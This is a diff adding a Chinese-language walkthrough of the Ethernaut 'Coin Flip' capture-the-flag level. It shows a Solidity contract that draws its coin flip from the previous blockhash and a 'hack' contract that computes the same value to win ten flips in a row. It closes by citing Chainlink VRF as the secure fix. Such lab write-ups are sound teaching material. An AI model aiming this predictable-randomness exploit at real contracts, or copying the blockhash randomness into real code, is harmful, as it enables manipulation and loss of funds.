@@ -205,3 +205,122 @@ contract Fallout {
 ### 参考资料
 
 [Constructors](https://docs.soliditylang.org/en/latest/contracts.html?highlight=constructor#constructors)
+
+## 3. Coin Flip
+
+需要连续猜对 10 次掷硬币的结果
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract CoinFlip {
+
+  using SafeMath for uint256;
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() public {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    // block.number - 当前区块号
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+    if (lastHash == blockValue) {
+      revert(); // 无条件抛出异常
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);  // 向下取整
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+```
+
+- 实际上 `side` 的值并非随机，区块号、区块哈希等都是公开可获取的
+- 可以由另一个合约计算掷硬币的结果，并调用 `flip` 函数
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import '@openzeppelin/contracts/utils/math/SafeMath.sol';
+
+// 把需要调用的合约放在同一个文件
+contract CoinFlip {
+
+  using SafeMath for uint256;
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+    // 当前区块号不能等于上一区块号，意味着不能使用循环重复调用 flip
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+
+contract hack {
+    using SafeMath for uint256;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip coin;
+
+    constructor(address instance) {
+        coin = CoinFlip(instance);
+    }
+
+    function exploit() public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+        coin.flip(side);
+    }
+}
+```
+
+使用 Remix 部署合约
+
+![部署合约](img/ethernaut01.jpg)
+
+执行 10 次 `exploit` 函数
+
+![掷硬币 XD](img/ethernaut02.jpg)
+
+可以使用 [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number) 来获得安全的随机数
+
+### 参考资料
+
+[Deploy & Run — Remix - Ethereum IDE 1 documentation](https://remix-ide.readthedocs.io/en/latest/run.html)
